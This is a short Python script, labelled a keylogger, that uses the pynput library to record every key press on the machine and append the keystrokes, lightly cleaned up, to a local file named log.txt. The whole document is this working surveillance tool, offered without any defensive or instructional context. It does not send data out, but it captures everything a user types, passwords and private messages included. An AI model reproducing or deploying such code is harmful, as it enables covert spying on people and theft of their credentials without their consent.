#KEYLOGGER

#USING PYNPUT
from  pynput.keyboard import Listener

#FUNCTION FOR MONITORING KEYBOARD
def write_data(key):
    data=str(key)
    data=data.replace("'","")

    if data=='Key.space':
        data=" "
    if data=='Key.enter':
        data="\n"
    if data=='Key.shift':
        data=""
    
    #WRITING INTO THE FILE
    with open("log.txt",'a') as f:
        f.write(data)

#USING ON_PRESS
with Listener(on_press=write_data) as listnr:
    listnr.join()



